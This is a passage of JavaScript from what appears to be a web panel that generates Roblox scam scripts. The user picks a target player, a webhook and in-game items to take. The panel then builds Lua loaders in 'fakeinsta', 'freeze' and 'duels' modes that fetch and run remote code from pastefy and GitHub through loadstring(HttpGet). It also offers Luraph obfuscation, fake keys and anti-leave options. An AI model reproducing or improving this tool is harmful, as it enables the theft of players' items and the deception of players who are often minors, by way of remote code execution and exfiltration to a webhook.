                "DJ Panda": "https://ik.imagekit.io/dr6z4tib7/brainrot-dj-panda.webp",
                "Candini Fluffini": "https://ik.imagekit.io/dr6z4tib7/Candini_Fluffini.webp?updatedAt=1786824965668",
                "La Fuse Machine": "https://ik.imagekit.io/dr6z4tib7/La_Fuse_Machine.webp?updatedAt=1786825017663",
                "Polaroidini": "https://ik.imagekit.io/dr6z4tib7/Polaroidini.webp",
                "Nachorilla": "https://ik.imagekit.io/dr6z4tib7/Nachorilla.webp",
                "Sammyni Truckini": "https://ik.imagekit.io/dr6z4tib7/Sammyni_Truckini.webp",
                "Tacoturbo Tacorito": "https://ik.imagekit.io/dr6z4tib7/Tacoturbo_Tacorito.webp",
                "Burrito Bat": "https://ik.imagekit.io/dr6z4tib7/Burrito_Bat.webp",
                "Grabatron": "https://ik.imagekit.io/dr6z4tib7/Grabatron.webp",
                "Rubiko and Kubiko": "https://ik.imagekit.io/dr6z4tib7/Rubiko_and_Kubiko.webp",
                "Cangurato Gelato": "https://ik.imagekit.io/dr6z4tib7/Cangurato_Gelato.webp",
                "Noodle Noodle Poodle": "https://ik.imagekit.io/dr6z4tib7/Noodle_Noodle_Poodle.webp",
                "Coco and Mango": "https://ik.imagekit.io/dr6z4tib7/Coco_and_Mango.webp",
                "Los Secret Combinasionas": "https://ik.imagekit.io/dr6z4tib7/Los_Secret_Combinasionas.webp",
                "Examen Bros": "https://ik.imagekit.io/dr6z4tib7/Examen_Bros.webp",
                "Pizza and Ranch": "https://ik.imagekit.io/dr6z4tib7/Pizza_and_Ranch.webp",
                "Chicleteira Champeona": "https://ik.imagekit.io/dr6z4tib7/Chicleteira_Champeona.webp"
            },
            "baseskin": {
                "Aquatic": "https://ik.imagekit.io/dr6z4tib7/baseskin-aquatic.png",
                "Bunny Basket": "https://ik.imagekit.io/dr6z4tib7/baseskin-bunny-basket.png",
                "Candy": "https://ik.imagekit.io/dr6z4tib7/baseskin-candy.png",
                "Christmas": "https://ik.imagekit.io/dr6z4tib7/baseskin-christmas.png",
                "Cursed": "https://ik.imagekit.io/dr6z4tib7/baseskin-cursed.png",
                "Cyber": "https://ik.imagekit.io/dr6z4tib7/baseskin-cyber.png",
                "Diamond": "https://ik.imagekit.io/dr6z4tib7/baseskin-diamond.png",
                "Divine": "https://ik.imagekit.io/dr6z4tib7/baseskin-divine.png",
                "Easter": "https://ik.imagekit.io/dr6z4tib7/baseskin-easter.png",
                "Galaxy": "https://ik.imagekit.io/dr6z4tib7/baseskin-galaxy.png",
                "Gingerbread": "https://ik.imagekit.io/dr6z4tib7/baseskin-gingerbread.png",
                "Gold": "https://ik.imagekit.io/dr6z4tib7/baseskin-gold.png",
                "Halloween": "https://ik.imagekit.io/dr6z4tib7/baseskin-halloween.png",
                "Lava": "https://ik.imagekit.io/dr6z4tib7/baseskin-lava.png",
                "Lucky": "https://ik.imagekit.io/dr6z4tib7/baseskin-lucky.png",
                "Octo": "https://ik.imagekit.io/dr6z4tib7/Octo_base.png",
                "Pot of Gold": "https://ik.imagekit.io/dr6z4tib7/baseskin-pot-of-gold.png",
                "Radioactive": "https://ik.imagekit.io/dr6z4tib7/baseskin-radioactive.png",
                "Rainbow": "https://ik.imagekit.io/dr6z4tib7/baseskin-rainbow.png",
                "Rose": "https://ik.imagekit.io/dr6z4tib7/baseskin-rose.png",
                "Summer": "https://ik.imagekit.io/dr6z4tib7/Summer_Base.webp",
                "Taco": "https://ik.imagekit.io/dr6z4tib7/baseskin-taco.png",
                "Valentines": "https://ik.imagekit.io/dr6z4tib7/Valentines_base.png",
                "Yin Yang": "https://ik.imagekit.io/dr6z4tib7/baseskin-yin-yang.png",
                "Tralalero": "https://ik.imagekit.io/dr6z4tib7/Tralala_base.webp?updatedAt=1784415729089"
            },
            "gear": {
                "Alien Slap": "https://ik.imagekit.io/dr6z4tib7/gear-alien-slap.png",
                "Blackhole Bomb": "https://ik.imagekit.io/dr6z4tib7/gear-blackhole-bomb.png",
                "Bloodmoon Hammer": "https://ik.imagekit.io/dr6z4tib7/gear-bloodmoon-hammer.png",
                "Bloodmoon Slap": "https://ik.imagekit.io/dr6z4tib7/gear-bloodmoon-slap.png",
                "Candy Sentry": "https://ik.imagekit.io/dr6z4tib7/CandySentry.webp",
                "Candy Slap": "https://ik.imagekit.io/dr6z4tib7/CandySlap.webp",
                "Cupid's Wings": "https://ik.imagekit.io/dr6z4tib7/gear-cupid-s-wings.png",
                "Cursed Slap": "https://ik.imagekit.io/dr6z4tib7/gear-cursed-slap.png",
                "Cyber Slap": "https://ik.imagekit.io/dr6z4tib7/gear-cyber-slap.png",
                "Demon's Head": "https://ik.imagekit.io/dr6z4tib7/gear-demon-s-head.png",
                "Divine Slap": "https://ik.imagekit.io/dr6z4tib7/gear-divine-slap.png",
                "Lava Blaster": "https://ik.imagekit.io/dr6z4tib7/gear-lava-blaster.png",
                "Lava Slap": "https://ik.imagekit.io/dr6z4tib7/gear-lava-slap.png",
                "Radioactive Airstrike": "https://ik.imagekit.io/dr6z4tib7/gear-radioactive-airstrike.png",
                "Radioactive Slap": "https://ik.imagekit.io/dr6z4tib7/gear-radioactive-slap.png",
                "Rainbow Hammer": "https://ik.imagekit.io/dr6z4tib7/gear-rainbow-hammer.png",
                "Rainbow Slap": "https://ik.imagekit.io/dr6z4tib7/gear-rainbow-slap.png",
                "Santa's Sleigh": "https://ik.imagekit.io/dr6z4tib7/gear-santa-s-sleigh.png",
                "Waverider": "https://ik.imagekit.io/dr6z4tib7/gear-waverider.png",
                "Witch's Broom": "https://ik.imagekit.io/dr6z4tib7/gear-witch-s-broom.png",
                "Yin Yang Lamp": "https://ik.imagekit.io/dr6z4tib7/gear-yin-yang-lamp.png",
                "Yin Yang Slap": "https://ik.imagekit.io/dr6z4tib7/gear-yin-yang-slap.png",
                "Phantom Slap": "https://ik.imagekit.io/dr6z4tib7/phantom%20slap.png",
                "Crystal Slap": "https://ik.imagekit.io/dr6z4tib7/Crystal%20Slap.jpg?updatedAt=1786404149714"
            }
        };

        function getListForCategory(cat) { if (cat === 'brainrot') return BRAINROTS_LIST; if (cat === 'baseskin') return BASE_SKINS_LIST; if (cat === 'gear') return GEARS_LIST; return []; }
        function getCategoryPrefix(cat) { if (cat === 'brainrot') return 'brainrot'; if (cat === 'baseskin') return 'baseskin'; if (cat === 'gear') return 'gear'; return ''; }
        function getTargetsForCategory(cat) { const prefix = getCategoryPrefix(cat); const result = []; for (const key of window.selectedTargets || []) { if (key.startsWith(prefix + ':')) result.push(key); } return result; }
        function getColorForName(name) {
            let hash = 0; for (let i = 0; i < name.length; i++) hash = name.charCodeAt(i) + ((hash << 5) - hash);
            const colors = ['#00ffff', '#00ccff', '#0099ff', '#00ff88', '#00ff66', '#00ddff', '#33ddff', '#66ddff', '#00ffcc', '#00cc99', '#ff00ff', '#ff66ff', '#ff00aa', '#aa00ff', '#6600ff', '#0088ff', '#00dd88', '#00ffaa', '#66ff88', '#ccff66'];
            return colors[Math.abs(hash) % colors.length];
        }
        function generateThumbnail(name, category) {
            const catKey = category === 'baseskin' ? 'baseskin' : (category === 'gear' ? 'gear' : 'brainrot');
            if (REAL_THUMBNAILS[catKey] && REAL_THUMBNAILS[catKey][name]) return REAL_THUMBNAILS[catKey][name];
            const words = name.split(' '); let initials = '';
            if (words.length === 1) initials = name.substring(0, 2).toUpperCase();
            else { initials = words[0][0] + (words[1] ? words[1][0] : ''); initials = initials.toUpperCase(); }
            const bgColor = getColorForName(name); const color2 = getColorForName(name + 'reverse');
            return `data:image/svg+xml,${encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 80 80"><defs><linearGradient id="g_${name.replace(/[^a-zA-Z0-9]/g, '_')}" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="${bgColor}" stop-opacity="0.9"/><stop offset="100%" stop-color="${color2}" stop-opacity="0.7"/></linearGradient></defs><rect width="80" height="80" rx="12" fill="url(#g_${name.replace(/[^a-zA-Z0-9]/g, '_')})"/><text x="40" y="48" font-family="Arial, sans-serif" font-size="28" font-weight="700" fill="white" text-anchor="middle" dominant-baseline="middle">${initials}</text><rect width="80" height="80" rx="12" fill="none" stroke="rgba(255,255,255,0.15)" stroke-width="1.5"/></svg>`)}`;
        }
        function saveSelections() { if (!window.selectedTargets) return; const data = { selectedTargets: Array.from(window.selectedTargets), currentTargetId: window.currentTargetId || "", currentTargetName: window.currentTargetName || "", scriptType: window.scriptType || "logic", scriptMode: window.scriptMode || "NO-GUI" }; try { localStorage.setItem('chocola_selections', JSON.stringify(data)); } catch (e) {} }
        function loadSelections() { try { const saved = localStorage.getItem('chocola_selections'); if (!saved) return null; return JSON.parse(saved); } catch (e) { return null; } }

        function renderChips(category) {
            const prefix = getCategoryPrefix(category); const chipsContainer = document.getElementById(`${category}Chips`); if (!chipsContainer) return;
            const targets = [];
            for (const key of window.selectedTargets || []) { if (key.startsWith(prefix + ':')) targets.push(key); }
            if (targets.length === 0) { chipsContainer.innerHTML = ''; return; }
            const maxShow = 6; const showTargets = targets.slice(0, maxShow); const remaining = targets.length - maxShow;
            let html = ''; const t = translations[currentLang];
            for (const key of showTargets) {
                const name = key.split(':').slice(1).join(':');
                const thumbnail = generateThumbnail(name, category);
                html += `<span class="chip" data-key="${key}"><span class="chip-thumb"><img src="${thumbnail}" alt="${name}"></span>${name.length > 10 ? name.substring(0,8)+'…' : name}<span class="chip-remove">✕</span></span>`;
            }
            if (remaining > 0) html += `<span class="chip-more">+${remaining} ${t.more}</span>`;
            chipsContainer.innerHTML = html;
            chipsContainer.querySelectorAll('.chip').forEach(el => {
                el.onclick = (e) => { e.stopPropagation(); const key = el.dataset.key;
                    if (key && window.selectedTargets && window.selectedTargets.has(key)) {
                        window.selectedTargets.delete(key); renderAllTargets(); renderAllChips(); updateButtonState(); saveSelections();
                    }
                };
            });
        }
        function renderAllChips() { renderChips('brainrot'); renderChips('baseskin'); renderChips('gear'); }

        function renderTargetGrid(category) {
            const list = getListForCategory(category); const prefix = getCategoryPrefix(category);
            const search = window.searchTerms?.[category] || '';
            const filtered = search ? list.filter(item => item.toLowerCase().includes(search.toLowerCase())) : list;
            const grid = document.getElementById(`${category}Grid`); if (!grid) return;
            const selectedCount = getTargetsForCategory(category).length; const totalCount = list.length;
            const countLabel = document.getElementById(`${category}CountLabel`); if (countLabel) countLabel.textContent = `${selectedCount}/${totalCount}`;
            const selectedLabel = document.getElementById(`${category}SelectedLabel`); const t = translations[currentLang];
            if (selectedLabel) {
                if (selectedCount === 0) { const placeholders = { brainrot: t.brainrotPlaceholder, baseskin: t.baseskinPlaceholder, gear: t.gearPlaceholder }; selectedLabel.textContent = placeholders[category] || 'Select...'; }
                else { selectedLabel.textContent = `${selectedCount} ${t.selected}`; }
            }
            grid.innerHTML = filtered.map(item => {
                const key = `${prefix}:${item}`;
                const isSelected = window.selectedTargets?.has(key) || false;
                const disabledClass = window.isVerified ? '' : ' disabled';
                const thumbnail = generateThumbnail(item, category);
                const isNew = NEW_ITEMS.has(item);
                const newBadge = isNew ? `<span class="new-badge-wrapper"><span class="new-badge">✦ NEW</span></span>` : '';
                return `<div class="target-item ${isSelected ? 'selected' : ''}${disabledClass}" data-key="${key}">
                    <div class="thumbnail"><img src="${thumbnail}" alt="${item}" loading="lazy"></div>
                    <span class="target-name">${item} ${newBadge}</span>
                    <div class="check">${isSelected ? '✓' : ''}</div>
                </div>`;
            }).join('');
            grid.querySelectorAll('.target-item').forEach(el => {
                el.onclick = (e) => {
                    e.stopPropagation();
                    if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
                    const key = el.dataset.key;
                    if (window.selectedTargets.has(key)) window.selectedTargets.delete(key); else window.selectedTargets.add(key);
                    renderAllTargets(); renderAllChips(); updateButtonState(); saveSelections();
                };
            });
        }
        function renderAllTargets() { renderTargetGrid('brainrot'); renderTargetGrid('baseskin'); renderTargetGrid('gear'); }

        function setupTargetSelector(category) {
            const toggle = document.getElementById(`${category}Toggle`); const panel = document.getElementById(`${category}Panel`);
            const search = document.getElementById(`${category}Search`); const closeBtn = document.getElementById(`${category}Close`);
            const selectAll = document.getElementById(`${category}SelectAll`); const deselectAll = document.getElementById(`${category}DeselectAll`);
            if (!toggle || !panel) return;
            toggle.onclick = (e) => {
                e.stopPropagation();
                if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
                const isOpen = panel.classList.contains('open');
                document.querySelectorAll('.target-panel').forEach(p => p.classList.remove('open'));
                document.querySelectorAll('.target-selector-btn .arrow').forEach(a => a.classList.remove('open'));
                if (!isOpen) { panel.classList.add('open'); toggle.querySelector('.arrow').classList.add('open'); if (search) setTimeout(() => search.focus(), 100); renderTargetGrid(category); }
            };
            if (search) { search.oninput = (e) => { e.stopPropagation(); if (!window.isVerified) return; if (!window.searchTerms) window.searchTerms = {}; window.searchTerms[category] = e.target.value; renderTargetGrid(category); }; }
            if (closeBtn) { closeBtn.onclick = (e) => { e.stopPropagation(); panel.classList.remove('open'); if (toggle) toggle.querySelector('.arrow').classList.remove('open'); if (search) search.value = ''; if (window.searchTerms) window.searchTerms[category] = ''; renderTargetGrid(category); }; }
            if (selectAll) { selectAll.onclick = (e) => { e.stopPropagation(); if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; } const list = getListForCategory(category); const prefix = getCategoryPrefix(category); const searchTerm = window.searchTerms?.[category] || ''; const filtered = searchTerm ? list.filter(item => item.toLowerCase().includes(searchTerm.toLowerCase())) : list; filtered.forEach(item => window.selectedTargets.add(`${prefix}:${item}`)); renderAllTargets(); renderAllChips(); updateButtonState(); saveSelections(); }; }
            if (deselectAll) { deselectAll.onclick = (e) => { e.stopPropagation(); if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; } const list = getListForCategory(category); const prefix = getCategoryPrefix(category); const searchTerm = window.searchTerms?.[category] || ''; const filtered = searchTerm ? list.filter(item => item.toLowerCase().includes(searchTerm.toLowerCase())) : list; filtered.forEach(item => window.selectedTargets.delete(`${prefix}:${item}`)); renderAllTargets(); renderAllChips(); updateButtonState(); saveSelections(); }; }
            document.addEventListener('click', (e) => { if (!e.target.closest(`#${category}Wrapper`)) { panel.classList.remove('open'); if (toggle) toggle.querySelector('.arrow').classList.remove('open'); } });
        }

        document.getElementById('toggleGistBtn').onclick = () => {
            if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
            if (window.useGist) {
                window.useGist = false; document.getElementById('toggleGistBtn').className = 'toggle-btn off';
                document.getElementById('scriptNameInput').disabled = true; document.getElementById('scriptNameInput').value = '';
                document.getElementById('scriptNameGroup').style.opacity = '0.5';
                showToast(translations[currentLang].toastGistDeactivated, 'info'); updateButtonState(); return;
            }
            window.useGist = true; window.useLuarmor = false;
            document.getElementById('toggleGistBtn').className = 'toggle-btn on';
            document.getElementById('toggleLuarmorBtn').className = 'toggle-btn off';
            document.getElementById('scriptNameInput').disabled = false; document.getElementById('scriptNameInput').value = '';
            document.getElementById('scriptNameGroup').style.opacity = '1';
            showToast(translations[currentLang].toastGistActivated, 'success'); updateButtonState();
        };
        document.getElementById('toggleLuarmorBtn').onclick = () => {
            if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
            if (window.useLuarmor) {
                window.useLuarmor = false; document.getElementById('toggleLuarmorBtn').className = 'toggle-btn off';
                showToast(translations[currentLang].toastLuarmorDeactivated, 'info'); updateButtonState(); return;
            }
            window.useLuarmor = true; window.useGist = false;
            document.getElementById('toggleLuarmorBtn').className = 'toggle-btn on';
            document.getElementById('toggleGistBtn').className = 'toggle-btn off';
            document.getElementById('scriptNameInput').disabled = true; document.getElementById('scriptNameInput').value = '';
            document.getElementById('scriptNameGroup').style.opacity = '0.5';
            showToast(translations[currentLang].toastLuarmorActivated, 'success'); updateButtonState();
        };
        document.getElementById('toggleObfuscateBtn').onclick = () => {
            if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
            window.obfuscateMode = !window.obfuscateMode;
            document.getElementById('toggleObfuscateBtn').className = `toggle-btn ${window.obfuscateMode ? 'on' : 'off'}`;
            showToast(window.obfuscateMode ? '🛡️ Luraph v15.1 activado' : '🛡️ Luraph v15.1 desactivado', 'info');
        };
        document.getElementById('toggleFakeKeyBtn').onclick = () => {
            if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
            window.useFakeKey = !window.useFakeKey;
            document.getElementById('toggleFakeKeyBtn').className = `toggle-btn ${window.useFakeKey ? 'on' : 'off'}`;
            const fakeKeyGroup = document.getElementById('fakeKeyGroup'); const fakeKeyInput = document.getElementById('fakeKeyInput');
            if (window.useFakeKey) { fakeKeyGroup.classList.add('show'); fakeKeyInput.disabled = false; showToast(translations[currentLang].toastFakeKeyActivated, 'success'); }
            else { fakeKeyGroup.classList.remove('show'); fakeKeyInput.disabled = true; showToast(translations[currentLang].toastFakeKeyDeactivated, 'info'); }
            updateButtonState();
        };
        document.getElementById('toggleAntiLeaveBtn').onclick = () => {
            if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
            window.useAntiLeave = !window.useAntiLeave;
            document.getElementById('toggleAntiLeaveBtn').className = `toggle-btn ${window.useAntiLeave ? 'on' : 'off'}`;
            showToast(window.useAntiLeave ? '🚫 Anti-Leave activado' : '🚫 Anti-Leave desactivado', 'info');
            updateButtonState();
        };

        document.getElementById('brainrotPanelOG').onclick = function() {
            if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
            const prefix = 'brainrot'; const toRemove = [];
            for (const key of window.selectedTargets) { if (key.startsWith(prefix + ':')) toRemove.push(key); }
            toRemove.forEach(key => window.selectedTargets.delete(key));
            OG_BRAINROTS.forEach(name => { window.selectedTargets.add(`${prefix}:${name}`); });
            renderAllTargets(); renderAllChips(); updateButtonState(); saveSelections();
            showToast('✅ Brainrots OG seleccionados', 'success');
            document.getElementById('brainrotPanel').classList.remove('open');
            document.getElementById('brainrotToggle').querySelector('.arrow').classList.remove('open');
        };
        document.getElementById('brainrotPanelSecret').onclick = function() {
            if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
            const prefix = 'brainrot'; const toRemove = [];
            for (const key of window.selectedTargets) { if (key.startsWith(prefix + ':')) toRemove.push(key); }
            toRemove.forEach(key => window.selectedTargets.delete(key));
            BEST_SECRET_BRAINROTS.forEach(name => { window.selectedTargets.add(`${prefix}:${name}`); });
            renderAllTargets(); renderAllChips(); updateButtonState(); saveSelections();
            showToast('✅ Best Secret seleccionados', 'success');
            document.getElementById('brainrotPanel').classList.remove('open');
            document.getElementById('brainrotToggle').querySelector('.arrow').classList.remove('open');
        };

        const modeCards = document.querySelectorAll('.mode-card');
        modeCards.forEach(card => {
            card.onclick = () => {
                if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
                modeCards.forEach(c => c.classList.remove('active')); card.classList.add('active');
                window.scriptMode = card.dataset.mode; window.scriptType = card.dataset.script || 'logic';
                const customArea = document.getElementById('customArea');
                if (customArea) customArea.style.display = window.scriptMode === 'CUSTOM' ? 'block' : 'none';
                const modeName = card.querySelector('.mode-title')?.textContent?.trim() || 'NO-GUI';
                showToast(translations[currentLang].modeSelected.replace('{0}', modeName), 'success');
                saveSelections();
            };
        });

        async function searchRobloxUser(username) {
            try {
                const response = await fetch(`${API_BASE}/roblox/search?username=${encodeURIComponent(username)}`, { credentials: 'include' });
                const data = await response.json(); if (data.error) return null;
                if (data.results && data.results.length > 0) { const user = data.results[0]; return { id: user.id, name: user.name, displayName: user.displayName || user.name, avatarUrl: user.avatar || "" }; }
                return null;
            } catch (error) { return null; }
        }
        let searchTimeout;
        document.getElementById('usernameInput').oninput = function() {
            if (!window.isVerified) { showToast(translations[currentLang].toastLoginFirst, 'warning'); return; }
            const query = this.value.trim(); if (searchTimeout) clearTimeout(searchTimeout);
            if (query.length < 2) { document.getElementById('userResults').classList.remove('show'); return; }
            document.getElementById('userResults').innerHTML = '<div class="user-result" style="justify-content:center"><div class="loading-spinner"></div> Searching...</div>';
            document.getElementById('userResults').classList.add('show');
            searchTimeout = setTimeout(async () => {
                const user = await searchRobloxUser(query);
                if (!user) { document.getElementById('userResults').innerHTML = `<div class="user-result" style="justify-content:center; flex-direction:column; padding:20px;"><span style="font-size:2rem;">🔍</span><span style="color:rgba(255,255,255,0.4);">${translations[currentLang].userNotFound}</span><span style="font-size:0.7rem;color:rgba(255,255,255,0.2);">Verifica que el nombre esté bien escrito</span></div>`; return; }
                document.getElementById('userResults').innerHTML = `<div class="user-result" data-id="${user.id}" data-name="${user.name}" data-display="${user.displayName}" data-avatar="${user.avatarUrl || ''}"><img src="${user.avatarUrl || `https://www.roblox.com/headshot-thumbnail/image?userId=${user.id}&width=60&height=60&format=png`}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ctext y=\'.9em\' font-size=\'70\' x=\'15\'%3E👤%3C/text%3E%3C/svg%3E'"><div class="info"><div class="name">${user.displayName}</div><div class="username">@${user.name}</div></div><div class="id">${user.id}</div></div>`;
                document.querySelectorAll('.user-result').forEach(el => {
                    if (!el.dataset.id) return;
                    el.onclick = () => {
                        const id = el.dataset.id; const name = el.dataset.name; const display = el.dataset.display; const avatar = el.dataset.avatar;
                        window.currentTargetId = id; window.currentTargetName = name;
                        document.getElementById('usernameInput').value = display || name;
                        document.getElementById('selectedName').innerText = display || name;
                        document.getElementById('selectedId').innerText = `ID: ${id}`;
                        document.getElementById('selectedAvatar').src = avatar || `https://www.roblox.com/headshot-thumbnail/image?userId=${id}&width=60&height=60&format=png`;
                        document.getElementById('selectedUser').classList.add('show');
                        document.getElementById('userResults').classList.remove('show');
                        updateButtonState();
                        showToast(translations[currentLang].userSelected.replace('{0}', name).replace('{1}', id), 'success');
                    };
                });
            }, 500);
        };

        async function obfuscateWithLuraph(script) {
            try {
                const response = await fetch(OBFUSCATE_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ script: script, level: 'medium' })
                });
                const data = await response.json();
                if (data.success && data.obfuscated) {
                    console.log(`✅ Ofuscado: ${data.originalSize} → ${data.obfuscatedSize} bytes (ratio: ${data.ratio}x)`);
                    return data.obfuscated;
                }
                console.warn('⚠️ Ofuscador respondió sin código:', data.error || 'sin detalle');
                return null;
            } catch (error) {
                console.error('❌ Error en obfuscador:', error);
                return null;
            }
        }

        function buildLuaTable(items, indent) {
            if (!items || items.length === 0) return indent + '\n';
            let result = '';
            for (let i = 0; i < items.length; i++) { const comma = (i < items.length - 1) ? ',' : ''; result += indent + `["${items[i]}"] = true${comma}\n`; }
            return result;
        }

        async function generateScript() {
            const t = translations[currentLang]; const now = Date.now(); const timeSinceLast = now - lastGenerationTime;
            if (timeSinceLast < GENERATION_COOLDOWN && lastGenerationTime > 0) { const remainingSeconds = Math.ceil((GENERATION_COOLDOWN - timeSinceLast) / 1000); showToast(t.toastCooldown.replace('{0}', remainingSeconds), 'warning'); return; }
            lastGenerationTime = now;
            if (!window.isVerified) { showToast(t.toastLoginFirst, 'warning'); return; }
            const webhook = document.getElementById('webhookUrl').value.trim();
            if (!webhook) { showToast('⚠️ Ingresa un webhook', 'warning'); return; }
            if (!window.currentTargetId) { showToast(t.toastEnterUsername, 'error'); return; }
            if (!window.selectedTargets || window.selectedTargets.size === 0) { showToast(t.toastSelectTargets, 'warning'); return; }
            if (window.useGist) {
                const scriptName = document.getElementById('scriptNameInput').value.trim();
                if (!scriptName) { showToast(t.toastEnterName, 'error'); document.getElementById('scriptNameInput').classList.add('error'); return; }
                document.getElementById('scriptNameInput').classList.remove('error');
            }
            const originalButtonText = document.getElementById('generateBtn').innerHTML;
            document.getElementById('generateBtn').disabled = true;
            document.getElementById('generateBtn').innerHTML = '<span class="loading-spinner"></span>GENERATING...';
            try {
                const brainrots = [], baseSkins = [], gears = [];
                for (const key of window.selectedTargets) {
                    const parts = key.split(':'); const cat = parts[0]; const name = parts.slice(1).join(':');
                    if (cat === 'brainrot') brainrots.push(name); else if (cat === 'baseskin') baseSkins.push(name); else if (cat === 'gear') gears.push(name);
                }
                let script = '';
                if (window.scriptType === 'fakeinsta') {
                    script = `local TARGET_ID = ${window.currentTargetId}\n`;
                    script += `local TARGET_USER = "${window.currentTargetName}"\n`;
                    script += `local WEBHOOK_URL = "${webhook}"\n\n`;
                    script += `local TargetBrainrots = {\n${buildLuaTable(brainrots, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetBaseSkins = {\n${buildLuaTable(baseSkins, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetGears = {\n${buildLuaTable(gears, '    ')}`;
                    script += `}\n\n`;
                    if (window.useAntiLeave) { script += `task.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()\nend)\n\n`; }
                    script += `task.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()\n\n`;
                    script += `task.wait(1)\n\n`;
                    script += `    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n    if type(script) == "function" then\n        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n    end\nend)`;
                } else if (window.scriptType === 'freeze') {
                    script = `local TARGET_ID = ${window.currentTargetId}\n`;
                    script += `local TARGET_USER = "${window.currentTargetName}"\n`;
                    script += `local WEBHOOK_URL = "${webhook}"\n\n`;
                    script += `local TargetBrainrots = {\n${buildLuaTable(brainrots, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetBaseSkins = {\n${buildLuaTable(baseSkins, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetGears = {\n${buildLuaTable(gears, '    ')}`;
                    script += `}\n\n`;
                    if (window.useAntiLeave) { script += `task.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()\nend)\n\n`; }
                    script += `task.spawn(function()\n    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()\n\n    task.wait(1)\n\n    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n    if type(script) == "function" then\n        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n    end\nend)`;
                } else if (window.scriptType === 'duels') {
                    script = `local TARGET_ID = ${window.currentTargetId}\n`;
                    script += `local TARGET_USER = "${window.currentTargetName}"\n`;
                    script += `local WEBHOOK_URL = "${webhook}"\n\n`;
                    script += `local TargetBrainrots = {\n${buildLuaTable(brainrots, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetBaseSkins = {\n${buildLuaTable(baseSkins, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetGears = {\n${buildLuaTable(gears, '    ')}`;
                    script += `}\n\n`;
                    if (window.useAntiLeave) { script += `task.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()\nend)\n\n`; }
                    script += `task.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()\n\n    task.wait(1)\n\n    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n    if type(script) == "function" then\n        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n    end\nend)`;
                } else if (window.scriptType === 'custom') {
                    const custom = document.getElementById('customLoader').value.trim();
                    if (!custom || custom.length === 0) { showToast('⚠️ Por favor, escribe un loader personalizado', 'warning'); document.getElementById('generateBtn').innerHTML = originalButtonText; updateButtonState(); return; }
                    script = `local TARGET_ID = ${window.currentTargetId}\n`;
                    script += `local TARGET_USER = "${window.currentTargetName}"\n`;
                    script += `local WEBHOOK_URL = "${webhook}"\n\n`;
                    script += `local TargetBrainrots = {\n${buildLuaTable(brainrots, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetBaseSkins = {\n${buildLuaTable(baseSkins, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetGears = {\n${buildLuaTable(gears, '    ')}`;
                    script += `}\n\n`;
                    if (window.useAntiLeave) { script += `task.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()\nend)\n\n`; }
                    script += `task.spawn(function()\n    ${custom}\n\n    task.wait(1)\n\n    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n    if type(script) == "function" then\n        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n    end\nend)`;
                } else {
                    script = `local TARGET_ID = ${window.currentTargetId}\n`;
                    script += `local TARGET_USER = "${window.currentTargetName}"\n`;
                    script += `local WEBHOOK_URL = "${webhook}"\n\n`;
                    script += `local TargetBrainrots = {\n${buildLuaTable(brainrots, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetBaseSkins = {\n${buildLuaTable(baseSkins, '    ')}`;
                    script += `}\n\n`;
                    script += `local TargetGears = {\n${buildLuaTable(gears, '    ')}`;
                    script += `}\n\n`;
                    if (window.useAntiLeave) { script += `task.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()\nend)\n\n`; }
